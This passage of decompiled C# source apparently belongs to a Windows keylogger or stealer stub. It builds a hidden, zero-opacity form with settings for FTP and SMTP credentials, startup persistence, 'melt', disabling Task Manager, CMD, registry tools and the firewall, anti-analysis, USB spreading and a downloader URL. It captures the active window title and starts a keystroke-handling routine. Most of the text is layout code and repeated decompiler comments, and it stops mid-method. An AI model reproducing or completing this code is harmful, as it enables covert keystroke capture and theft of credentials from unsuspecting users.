		componentResourceManager.ApplyResources(lblFTPPassword, "lblFTPPassword");
		((Control)lblFTPPassword).set_Name("lblFTPPassword");
		Timer3.set_Interval(60000);
		componentResourceManager.ApplyResources(Crap, "Crap");
		((Control)Crap).set_Name("Crap");
		componentResourceManager.ApplyResources(lblMelt, "lblMelt");
		((Control)lblMelt).set_Name("lblMelt");
		componentResourceManager.ApplyResources(txtWin, "txtWin");
		((Control)txtWin).set_Name("txtWin");
		componentResourceManager.ApplyResources(lblPort, "lblPort");
		((Control)lblPort).set_Name("lblPort");
		componentResourceManager.ApplyResources(lblSMTP, "lblSMTP");
		((Control)lblSMTP).set_Name("lblSMTP");
		componentResourceManager.ApplyResources(lblWin, "lblWin");
		((Control)lblWin).set_Name("lblWin");
		Timer4.set_Interval(120000);
		componentResourceManager.ApplyResources(lblFTPBack, "lblFTPBack");
		((Control)lblFTPBack).set_Name("lblFTPBack");
		componentResourceManager.ApplyResources(lblSysRes, "lblSysRes");
		((Control)lblSysRes).set_Name("lblSysRes");
		componentResourceManager.ApplyResources(lblShow, "lblShow");
		((Control)lblShow).set_Name("lblShow");
		componentResourceManager.ApplyResources(lblDownloader, "lblDownloader");
		((Control)lblDownloader).set_Name("lblDownloader");
		componentResourceManager.ApplyResources(lblDownloadURL, "lblDownloadURL");
		((Control)lblDownloadURL).set_Name("lblDownloadURL");
		componentResourceManager.ApplyResources(lblDownloadFN, "lblDownloadFN");
		((Control)lblDownloadFN).set_Name("lblDownloadFN");
		componentResourceManager.ApplyResources(lblDownloadSP, "lblDownloadSP");
		((Control)lblDownloadSP).set_Name("lblDownloadSP");
		componentResourceManager.ApplyResources(lblWB, "lblWB");
		((Control)lblWB).set_Name("lblWB");
		componentResourceManager.ApplyResources(lblAnti, "lblAnti");
		((Control)lblAnti).set_Name("lblAnti");
		componentResourceManager.ApplyResources(lblCusWes, "lblCusWes");
		((Control)lblCusWes).set_Name("lblCusWes");
		componentResourceManager.ApplyResources(lblUSB, "lblUSB");
		((Control)lblUSB).set_Name("lblUSB");
		Timer5.set_Interval(190000);
		componentResourceManager.ApplyResources(TextBox3, "TextBox3");
		((Control)TextBox3).set_Name("TextBox3");
		componentResourceManager.ApplyResources(lblSaved, "lblSaved");
		((Control)lblSaved).set_Name("lblSaved");
		componentResourceManager.ApplyResources(TextBox4, "TextBox4");
		((Control)TextBox4).set_Name("TextBox4");
		Timer6.set_Interval(240000);
		componentResourceManager.ApplyResources(lblApp, "lblApp");
		((Control)lblApp).set_Name("lblApp");
		Timer7.set_Interval(300000);
		Timer8.set_Interval(600000);
		Timer9.set_Interval(90000);
		componentResourceManager.ApplyResources(lblExt, "lblExt");
		((Control)lblExt).set_Name("lblExt");
		componentResourceManager.ApplyResources(this, "$this");
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).get_Controls().Add((Control)(object)lblExt);
		((Control)this).get_Controls().Add((Control)(object)lblApp);
		((Control)this).get_Controls().Add((Control)(object)TextBox4);
		((Control)this).get_Controls().Add((Control)(object)lblSaved);
		((Control)this).get_Controls().Add((Control)(object)TextBox3);
		((Control)this).get_Controls().Add((Control)(object)lblUSB);
		((Control)this).get_Controls().Add((Control)(object)lblCusWes);
		((Control)this).get_Controls().Add((Control)(object)lblAnti);
		((Control)this).get_Controls().Add((Control)(object)lblWB);
		((Control)this).get_Controls().Add((Control)(object)lblDownloadSP);
		((Control)this).get_Controls().Add((Control)(object)lblDownloadFN);
		((Control)this).get_Controls().Add((Control)(object)lblDownloadURL);
		((Control)this).get_Controls().Add((Control)(object)lblDownloader);
		((Control)this).get_Controls().Add((Control)(object)lblShow);
		((Control)this).get_Controls().Add((Control)(object)lblSysRes);
		((Control)this).get_Controls().Add((Control)(object)lblFTPBack);
		((Control)this).get_Controls().Add((Control)(object)lblWin);
		((Control)this).get_Controls().Add((Control)(object)lblSMTP);
		((Control)this).get_Controls().Add((Control)(object)lblPort);
		((Control)this).get_Controls().Add((Control)(object)txtWin);
		((Control)this).get_Controls().Add((Control)(object)lblMelt);
		((Control)this).get_Controls().Add((Control)(object)Crap);
		((Control)this).get_Controls().Add((Control)(object)lblFTPPassword);
		((Control)this).get_Controls().Add((Control)(object)lblFTPUsername);
		((Control)this).get_Controls().Add((Control)(object)lblHost);
		((Control)this).get_Controls().Add((Control)(object)txtTitle);
		((Control)this).get_Controls().Add((Control)(object)txtContent);
		((Control)this).get_Controls().Add((Control)(object)lblFake);
		((Control)this).get_Controls().Add((Control)(object)lblInfo);
		((Control)this).get_Controls().Add((Control)(object)lblStartUp);
		((Control)this).get_Controls().Add((Control)(object)lblFileName);
		((Control)this).get_Controls().Add((Control)(object)lblRegistryTools);
		((Control)this).get_Controls().Add((Control)(object)lblCMD);
		((Control)this).get_Controls().Add((Control)(object)lblTaskManager);
		((Control)this).get_Controls().Add((Control)(object)lblInterval);
		((Control)this).get_Controls().Add((Control)(object)lblPassword);
		((Control)this).get_Controls().Add((Control)(object)lblUsername);
		((Control)this).get_Controls().Add((Control)(object)lblFirewall);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Control)this).set_Cursor(Cursors.get_Default());
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

	private string GetActiveWindowTitle()
	{
		string lpString = new string('\0', 100);
		GetWindowTextA(GetForegroundWindow(), ref lpString, 100);
		return lpString.Substring(0, checked(Strings.InStr(lpString, "\0", (CompareMethod)0) - 1));
	}

	public void shiftandcaps(Keys Key)
	{
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Invalid comparison between Unknown and I4
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_0059: Invalid comparison between Unknown and I4
		//IL_0082: Unknown result type (might be due to invalid IL or missing references)
		//IL_0085: Invalid comparison between Unknown and I4
		//IL_00ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b1: Invalid comparison between Unknown and I4
		//IL_00da: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dd: Invalid comparison between Unknown and I4
		//IL_0106: Unknown result type (might be due to invalid IL or missing references)
		//IL_0109: Invalid comparison between Unknown and I4
		//IL_0132: Unknown result type (might be due to invalid IL or missing references)
		//IL_0135: Invalid comparison between Unknown and I4
		//IL_015e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0161: Invalid comparison between Unknown and I4
		//IL_018a: Unknown result type (might be due to invalid IL or missing references)
		//IL_018d: Invalid comparison between Unknown and I4
		//IL_01b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b9: Invalid comparison between Unknown and I4
		//IL_01e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e5: Invalid comparison between Unknown and I4
		//IL_020e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0211: Invalid comparison between Unknown and I4
		//IL_023a: Unknown result type (might be due to invalid IL or missing references)
		//IL_023d: Invalid comparison between Unknown and I4
		//IL_0266: Unknown result type (might be due to invalid IL or missing references)
		//IL_0269: Invalid comparison between Unknown and I4
		//IL_0292: Unknown result type (might be due to invalid IL or missing references)
		//IL_0295: Invalid comparison between Unknown and I4
		//IL_02be: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c1: Invalid comparison between Unknown and I4
		//IL_02ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ed: Invalid comparison between Unknown and I4
		//IL_0316: Unknown result type (might be due to invalid IL or missing references)
		//IL_0319: Invalid comparison between Unknown and I4
		//IL_0342: Unknown result type (might be due to invalid IL or missing references)
		//IL_0345: Invalid comparison between Unknown and I4
		//IL_036e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0371: Invalid comparison between Unknown and I4
		//IL_039a: Unknown result type (might be due to invalid IL or missing references)
		//IL_039d: Invalid comparison between Unknown and I4
		//IL_03c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c9: Invalid comparison between Unknown and I4
		//IL_03f2: Unknown result type (might be due to invalid IL or missing references)
		//IL_03f5: Invalid comparison between Unknown and I4
		//IL_041e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0421: Invalid comparison between Unknown and I4
		//IL_044a: Unknown result type (might be due to invalid IL or missing references)
		//IL_044d: Invalid comparison between Unknown and I4
		//IL_0476: Unknown result type (might be due to invalid IL or missing references)
		//IL_0479: Invalid comparison between Unknown and I4
		//IL_04a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_04a5: Invalid comparison between Unknown and I4
		//IL_04ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_04d1: Invalid comparison between Unknown and I4
		//IL_04fa: Unknown result type (might be due to invalid IL or missing references)
		//IL_04fd: Invalid comparison between Unknown and I4
		//IL_0526: Unknown result type (might be due to invalid IL or missing references)
		//IL_0529: Invalid comparison between Unknown and I4
		//IL_0552: Unknown result type (might be due to invalid IL or missing references)
		//IL_0555: Invalid comparison between Unknown and I4
		//IL_057e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0581: Invalid comparison between Unknown and I4
		//IL_05aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_05ad: Invalid comparison between Unknown and I4
		//IL_05d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_05d9: Invalid comparison between Unknown and I4
		//IL_0602: Unknown result type (might be due to invalid IL or missing references)
		//IL_0605: Invalid comparison between Unknown and I4
		//IL_062e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0631: Invalid comparison between Unknown and I4
		//IL_065a: Unknown result type (might be due to invalid IL or missing references)
		//IL_065d: Invalid comparison between Unknown and I4
		//IL_0686: Unknown result type (might be due to invalid IL or missing references)
		//IL_0689: Invalid comparison between Unknown and I4
		//IL_06b2: Unknown result type (might be due to invalid IL or missing references)
		//IL_06b5: Invalid comparison between Unknown and I4
		//IL_06de: Unknown result type (might be due to invalid IL or missing references)
		//IL_06e1: Invalid comparison between Unknown and I4
		//IL_070a: Unknown result type (might be due to invalid IL or missing references)
		//IL_070d: Invalid comparison between Unknown and I4
		//IL_0736: Unknown result type (might be due to invalid IL or missing references)
		//IL_0739: Invalid comparison between Unknown and I4
		//IL_0762: Unknown result type (might be due to invalid IL or missing references)
		//IL_0765: Invalid comparison between Unknown and I4
		//IL_078e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0791: Invalid comparison between Unknown and I4
		//IL_07ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_07bd: Invalid comparison between Unknown and I4
		//IL_07e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_07e9: Invalid comparison between Unknown and I4
		//IL_0812: Unknown result type (might be due to invalid IL or missing references)
		//IL_0818: Invalid comparison between Unknown and I4
		//IL_0841: Unknown result type (might be due to invalid IL or missing references)
		//IL_0847: Invalid comparison between Unknown and I4
		//IL_0870: Unknown result type (might be due to invalid IL or missing references)
		//IL_0876: Invalid comparison between Unknown and I4
		//IL_089f: Unknown result type (might be due to invalid IL or missing references)
		//IL_08a5: Invalid comparison between Unknown and I4
		//IL_08ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_08d0: Invalid comparison between Unknown and I4
		//IL_08f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_08ff: Invalid comparison between Unknown and I4
		//IL_0928: Unknown result type (might be due to invalid IL or missing references)
		//IL_092e: Invalid comparison between Unknown and I4
		//IL_0957: Unknown result type (might be due to invalid IL or missing references)
		//IL_095d: Invalid comparison between Unknown and I4
		//IL_0986: Unknown result type (might be due to invalid IL or missing references)
		//IL_098c: Invalid comparison between Unknown and I4
		//IL_09b5: Unknown result type (might be due to invalid IL or missing references)
		//IL_09bb: Invalid comparison between Unknown and I4
		//IL_09e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_09ea: Invalid comparison between Unknown and I4
		//IL_0a13: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a16: Invalid comparison between Unknown and I4
		//IL_0a3f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a42: Invalid comparison between Unknown and I4
		//IL_0a6b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a6e: Invalid comparison between Unknown and I4
		//IL_0a97: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a9a: Invalid comparison between Unknown and I4
		//IL_0ac3: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ac6: Invalid comparison between Unknown and I4
		//IL_0aef: Unknown result type (might be due to invalid IL or missing references)
		//IL_0af2: Invalid comparison between Unknown and I4
		//IL_0b1b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b1e: Invalid comparison between Unknown and I4
		//IL_0b47: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b4a: Invalid comparison between Unknown and I4
		//IL_0b73: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b76: Invalid comparison between Unknown and I4
		//IL_0b9f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ba2: Invalid comparison between Unknown and I4
		//IL_0bcb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bce: Invalid comparison between Unknown and I4
		//IL_0bf7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bfa: Invalid comparison between Unknown and I4
		//IL_0c23: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c26: Invalid comparison between Unknown and I4
		//IL_0c4f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c52: Invalid comparison between Unknown and I4
		//IL_0c7b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c7e: Invalid comparison between Unknown and I4
		//IL_0cb5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cb7: Invalid comparison between Unknown and I4
		//IL_0cee: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cf1: Invalid comparison between Unknown and I4
		//IL_0d1a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d1d: Invalid comparison between Unknown and I4
		//IL_0d46: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d49: Invalid comparison between Unknown and I4
		//IL_0d72: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d75: Invalid comparison between Unknown and I4
		//IL_0d9e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0da1: Invalid comparison between Unknown and I4
		//IL_0dca: Unknown result type (might be due to invalid IL or missing references)
		//IL_0dcd: Invalid comparison between Unknown and I4
		//IL_0df6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0df9: Invalid comparison between Unknown and I4
		//IL_0e22: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e25: Invalid comparison between Unknown and I4
		//IL_0e4e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e51: Invalid comparison between Unknown and I4
		//IL_0e7a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e7d: Invalid comparison between Unknown and I4
		//IL_0ea6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ea9: Invalid comparison between Unknown and I4
		//IL_0ed2: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ed5: Invalid comparison between Unknown and I4
		//IL_0f28: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f2b: Invalid comparison between Unknown and I4
		//IL_0f54: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f57: Invalid comparison between Unknown and I4
		//IL_0f80: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f83: Invalid comparison between Unknown and I4
		//IL_0fac: Unknown result type (might be due to invalid IL or missing references)
		//IL_0faf: Invalid comparison between Unknown and I4
		//IL_0fd8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fdb: Invalid comparison between Unknown and I4
		//IL_1004: Unknown result type (might be due to invalid IL or missing references)
		//IL_1007: Invalid comparison between Unknown and I4
		//IL_1030: Unknown result type (might be due to invalid IL or missing references)
		//IL_1033: Invalid comparison between Unknown and I4
		//IL_105c: Unknown result type (might be due to invalid IL or missing references)
		//IL_105f: Invalid comparison between Unknown and I4
		//IL_1088: Unknown result type (might be due to invalid IL or missing references)
		//IL_108b: Invalid comparison between Unknown and I4
		//IL_10b4: Unknown result type (might be due to invalid IL or missing references)
		//IL_10b7: Invalid comparison between Unknown and I4
		//IL_10e0: Unknown result type (might be due to invalid IL or missing references)
		//IL_10e3: Invalid comparison between Unknown and I4
		//IL_110c: Unknown result type (might be due to invalid IL or missing references)
		//IL_110f: Invalid comparison between Unknown and I4
		//IL_1138: Unknown result type (might be due to invalid IL or missing references)
		//IL_113b: Invalid comparison between Unknown and I4
		//IL_1164: Unknown result type (might be due to invalid IL or missing references)
		//IL_1167: Invalid comparison between Unknown and I4
		//IL_1190: Unknown result type (might be due to invalid IL or missing references)
		//IL_1193: Invalid comparison between Unknown and I4
		//IL_11bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_11bf: Invalid comparison between Unknown and I4
		//IL_11e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_11eb: Invalid comparison between Unknown and I4
		//IL_1214: Unknown result type (might be due to invalid IL or missing references)
		//IL_1217: Invalid comparison between Unknown and I4
		//IL_1240: Unknown result type (might be due to invalid IL or missing references)
		//IL_1243: Invalid comparison between Unknown and I4
		//IL_126c: Unknown result type (might be due to invalid IL or missing references)
		//IL_126f: Invalid comparison between Unknown and I4
		//IL_1298: Unknown result type (might be due to invalid IL or missing references)
		//IL_129b: Invalid comparison between Unknown and I4
		//IL_12c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_12c7: Invalid comparison between Unknown and I4
		//IL_12f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_12f3: Invalid comparison between Unknown and I4
		//IL_131c: Unknown result type (might be due to invalid IL or missing references)
		//IL_131f: Invalid comparison between Unknown and I4
		//IL_1348: Unknown result type (might be due to invalid IL or missing references)
		//IL_134b: Invalid comparison between Unknown and I4
		//IL_1374: Unknown result type (might be due to invalid IL or missing references)
		//IL_1377: Invalid comparison between Unknown and I4
		//IL_13a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_13a3: Invalid comparison between Unknown and I4
		//IL_13cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_13cf: Invalid comparison between Unknown and I4
		//IL_13f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_13fb: Invalid comparison between Unknown and I4
		//IL_1424: Unknown result type (might be due to invalid IL or missing references)
		//IL_1427: Invalid comparison between Unknown and I4
		//IL_1450: Unknown result type (might be due to invalid IL or missing references)
		//IL_1453: Invalid comparison between Unknown and I4
		//IL_147c: Unknown result type (might be due to invalid IL or missing references)
		//IL_147f: Invalid comparison between Unknown and I4
		//IL_14a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_14ab: Invalid comparison between Unknown and I4
		//IL_14d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_14d7: Invalid comparison between Unknown and I4
		//IL_1500: Unknown result type (might be due to invalid IL or missing references)
		//IL_1503: Invalid comparison between Unknown and I4
		//IL_152c: Unknown result type (might be due to invalid IL or missing references)
		//IL_152f: Invalid comparison between Unknown and I4
		//IL_1558: Unknown result type (might be due to invalid IL or missing references)
		//IL_155b: Invalid comparison between Unknown and I4
		//IL_1584: Unknown result type (might be due to invalid IL or missing references)
		//IL_1587: Invalid comparison between Unknown and I4
		//IL_15b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_15b3: Invalid comparison between Unknown and I4
		//IL_15dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_15df: Invalid comparison between Unknown and I4
		//IL_1608: Unknown result type (might be due to invalid IL or missing references)
		//IL_160b: Invalid comparison between Unknown and I4
		//IL_1634: Unknown result type (might be due to invalid IL or missing references)
		//IL_1637: Invalid comparison between Unknown and I4
		//IL_1660: Unknown result type (might be due to invalid IL or missing references)
		//IL_1663: Invalid comparison between Unknown and I4
		//IL_168c: Unknown result type (might be due to invalid IL or missing references)
		//IL_168f: Invalid comparison between Unknown and I4
		//IL_16b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_16bb: Invalid comparison between Unknown and I4
		//IL_16e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_16e7: Invalid comparison between Unknown and I4
		//IL_1710: Unknown result type (might be due to invalid IL or missing references)
		//IL_1716: Invalid comparison between Unknown and I4
		//IL_173f: Unknown result type (might be due to invalid IL or missing references)
		//IL_1745: Invalid comparison between Unknown and I4
		//IL_176e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1774: Invalid comparison between Unknown and I4
		//IL_179d: Unknown result type (might be due to invalid IL or missing references)
		//IL_17a3: Invalid comparison between Unknown and I4
		//IL_17cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_17d2: Invalid comparison between Unknown and I4
		//IL_17fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_1801: Invalid comparison between Unknown and I4
		//IL_182a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1830: Invalid comparison between Unknown and I4
		//IL_1859: Unknown result type (might be due to invalid IL or missing references)
		//IL_185f: Invalid comparison between Unknown and I4
		//IL_1888: Unknown result type (might be due to invalid IL or missing references)
		//IL_188e: Invalid comparison between Unknown and I4
		//IL_18b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_18bd: Invalid comparison between Unknown and I4
		//IL_18e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_18e9: Invalid comparison between Unknown and I4
		//IL_1912: Unknown result type (might be due to invalid IL or missing references)
		//IL_1915: Invalid comparison between Unknown and I4
		//IL_193e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1941: Invalid comparison between Unknown and I4
		//IL_196a: Unknown result type (might be due to invalid IL or missing references)
		//IL_196d: Invalid comparison between Unknown and I4
		//IL_1996: Unknown result type (might be due to invalid IL or missing references)
		//IL_1999: Invalid comparison between Unknown and I4
		//IL_19c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_19c5: Invalid comparison between Unknown and I4
		//IL_19ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_19f1: Invalid comparison between Unknown and I4
		//IL_1a1a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1a1d: Invalid comparison between Unknown and I4
		//IL_1a46: Unknown result type (might be due to invalid IL or missing references)
		//IL_1a49: Invalid comparison between Unknown and I4
		//IL_1a72: Unknown result type (might be due to invalid IL or missing references)
		//IL_1a75: Invalid comparison between Unknown and I4
		//IL_1a9e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1aa1: Invalid comparison between Unknown and I4
		//IL_1aca: Unknown result type (might be due to invalid IL or missing references)
		//IL_1acd: Invalid comparison between Unknown and I4
		//IL_1af6: Unknown result type (might be due to invalid IL or missing references)
		//IL_1af9: Invalid comparison between Unknown and I4
		//IL_1b22: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b25: Invalid comparison between Unknown and I4
		//IL_1b4e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b51: Invalid comparison between Unknown and I4
		//IL_1b88: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b8a: Invalid comparison between Unknown and I4
		//IL_1bc1: Unknown result type (might be due to invalid IL or missing references)
		//IL_1bc4: Invalid comparison between Unknown and I4
		//IL_1bed: Unknown result type (might be due to invalid IL or missing references)
		//IL_1bf0: Invalid comparison between Unknown and I4
		//IL_1c19: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c1c: Invalid comparison between Unknown and I4
		//IL_1c45: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c48: Invalid comparison between Unknown and I4
		//IL_1c71: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c74: Invalid comparison between Unknown and I4
		//IL_1c9d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1ca0: Invalid comparison between Unknown and I4
		//IL_1cc9: Unknown result type (might be due to invalid IL or missing references)
		//IL_1ccc: Invalid comparison between Unknown and I4
		//IL_1cf5: Unknown result type (might be due to invalid IL or missing references)
		//IL_1cf8: Invalid comparison between Unknown and I4
		//IL_1d21: Unknown result type (might be due to invalid IL or missing references)
		//IL_1d24: Invalid comparison between Unknown and I4
		//IL_1d4d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1d50: Invalid comparison between Unknown and I4
		//IL_1d79: Unknown result type (might be due to invalid IL or missing references)
		//IL_1d7c: Invalid comparison between Unknown and I4
		//IL_1da5: Unknown result type (might be due to invalid IL or missing references)
		//IL_1da8: Invalid comparison between Unknown and I4
		//IL_1df8: Unknown result type (might be due to invalid IL or missing references)
		//IL_1dfb: Invalid comparison between Unknown and I4
		//IL_1e24: Unknown result type (might be due to invalid IL or missing references)
		//IL_1e27: Invalid comparison between Unknown and I4
		//IL_1e50: Unknown result type (might be due to invalid IL or missing references)
		//IL_1e53: Invalid comparison between Unknown and I4
		//IL_1e7c: Unknown result type (might be due to invalid IL or missing references)
		//IL_1e7f: Invalid comparison between Unknown and I4
		//IL_1ea8: Unknown result type (might be due to invalid IL or missing references)
		//IL_1eab: Invalid comparison between Unknown and I4
		//IL_1ed4: Unknown result type (might be due to invalid IL or missing references)
		//IL_1ed7: Invalid comparison between Unknown and I4
		//IL_1f00: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f03: Invalid comparison between Unknown and I4
		//IL_1f2c: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f2f: Invalid comparison between Unknown and I4
		//IL_1f58: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f5b: Invalid comparison between Unknown and I4
		//IL_1f84: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f87: Invalid comparison between Unknown and I4
		//IL_1fb0: Unknown result type (might be due to invalid IL or missing references)
		//IL_1fb3: Invalid comparison between Unknown and I4
		//IL_1fdc: Unknown result type (might be due to invalid IL or missing references)
		//IL_1fdf: Invalid comparison between Unknown and I4
		//IL_2008: Unknown result type (might be due to invalid IL or missing references)
		//IL_200b: Invalid comparison between Unknown and I4
		//IL_2034: Unknown result type (might be due to invalid IL or missing references)
		//IL_2037: Invalid comparison between Unknown and I4
		//IL_2060: Unknown result type (might be due to invalid IL or missing references)
		//IL_2063: Invalid comparison between Unknown and I4
		//IL_208c: Unknown result type (might be due to invalid IL or missing references)
		//IL_208f: Invalid comparison between Unknown and I4
		//IL_20b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_20bb: Invalid comparison between Unknown and I4
		//IL_20e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_20e7: Invalid comparison between Unknown and I4
		//IL_2110: Unknown result type (might be due to invalid IL or missing references)
		//IL_2113: Invalid comparison between Unknown and I4
		//IL_213c: Unknown result type (might be due to invalid IL or missing references)
		//IL_213f: Invalid comparison between Unknown and I4
		//IL_2168: Unknown result type (might be due to invalid IL or missing references)
		//IL_216b: Invalid comparison between Unknown and I4
		//IL_2194: Unknown result type (might be due to invalid IL or missing references)
		//IL_2197: Invalid comparison between Unknown and I4
		//IL_21c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_21c3: Invalid comparison between Unknown and I4
		//IL_21ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_21ef: Invalid comparison between Unknown and I4
		//IL_2218: Unknown result type (might be due to invalid IL or missing references)
		//IL_221b: Invalid comparison between Unknown and I4
		//IL_2244: Unknown result type (might be due to invalid IL or missing references)
		//IL_2247: Invalid comparison between Unknown and I4
		//IL_2270: Unknown result type (might be due to invalid IL or missing references)
		//IL_2273: Invalid comparison between Unknown and I4
		//IL_229c: Unknown result type (might be due to invalid IL or missing references)
		//IL_229f: Invalid comparison between Unknown and I4
		//IL_22c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_22cb: Invalid comparison between Unknown and I4
		//IL_22f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_22f7: Invalid comparison between Unknown and I4
		//IL_2320: Unknown result type (might be due to invalid IL or missing references)
		//IL_2323: Invalid comparison between Unknown and I4
		//IL_234c: Unknown result type (might be due to invalid IL or missing references)
		//IL_234f: Invalid comparison between Unknown and I4
		//IL_2378: Unknown result type (might be due to invalid IL or missing references)
		//IL_237b: Invalid comparison between Unknown and I4
		//IL_23a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_23a7: Invalid comparison between Unknown and I4
		//IL_23d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_23d3: Invalid comparison between Unknown and I4
		//IL_23fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_23ff: Invalid comparison between Unknown and I4
		//IL_2428: Unknown result type (might be due to invalid IL or missing references)
		//IL_242e: Invalid comparison between Unknown and I4
		//IL_2457: Unknown result type (might be due to invalid IL or missing references)
		//IL_245d: Invalid comparison between Unknown and I4
		//IL_2486: Unknown result type (might be due to invalid IL or missing references)
		//IL_248c: Invalid comparison between Unknown and I4
		//IL_24b5: Unknown result type (might be due to invalid IL or missing references)
		//IL_24bb: Invalid comparison between Unknown and I4
		//IL_24e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_24ea: Invalid comparison between Unknown and I4
		//IL_2513: Unknown result type (might be due to invalid IL or missing references)
		//IL_2519: Invalid comparison between Unknown and I4
		//IL_2542: Unknown result type (might be due to invalid IL or missing references)
		//IL_2548: Invalid comparison between Unknown and I4
		//IL_2571: Unknown result type (might be due to invalid IL or missing references)
		//IL_2577: Invalid comparison between Unknown and I4
		//IL_25a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_25a6: Invalid comparison between Unknown and I4
		//IL_25cf: Unknown result type (might be due to invalid IL or missing references)
